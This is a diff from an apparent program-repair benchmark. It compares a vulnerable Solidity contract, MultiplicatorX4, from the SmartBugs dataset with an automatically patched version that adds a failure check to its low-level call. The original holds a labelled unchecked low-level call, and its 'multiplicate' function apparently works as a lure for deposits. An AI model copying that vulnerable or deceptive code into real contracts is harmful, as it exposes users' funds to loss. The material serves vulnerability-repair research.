--- https://github.com/smartbugs/smartbugs-curated/tree/main/dataset/unchecked_low_level_calls/0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol
+++ https://github.com/ASSERT-KTH/RepairComp/blob/main/results/smartbugs/TIPS/unchecked_low_level_calls/0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859/0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859U1.sol
@@ -1,41 +1,20 @@
-/*

- * @source: etherscan.io 

- * @author: -

- * @vulnerable_at_lines: 29

- */

-

- pragma solidity ^0.4.18;

-

-contract MultiplicatorX4

-{

-    address public Owner = msg.sender;

-   

-    function() public payable{}

-   

-    function withdraw()

-    payable

-    public

-    {

-        require(msg.sender == Owner);

-        Owner.transfer(this.balance);

-    }

-    

-    function Command(address adr,bytes data)

-    payable

-    public

-    {

-        require(msg.sender == Owner);

-        // <yes> <report> UNCHECKED_LL_CALLS

-        adr.call.value(msg.value)(data);

-    }

-    

-    function multiplicate(address adr)

-    public

-    payable

-    {

-        if(msg.value>=this.balance)

-        {        

-            adr.transfer(this.balance+msg.value);

-        }

-    }

+contract MultiplicatorX4 {

+	address public Owner = msg.sender;

+	function () payable public {

+	}

+	function withdraw() payable public {

+	require(msg.sender == Owner);

+	Owner.transfer(this.balance);

+	}

+	function Command(address adr, bytes data) payable public {

+	require(msg.sender == Owner);

+	if(! adr.call.value(msg.value)(data)){

+	throw;}

+	}

+	function multiplicate(address adr) payable public {

+	if(msg.value >= this.balance){

+	adr.transfer(this.balance + msg.value);

+	}

+	}

+	

 }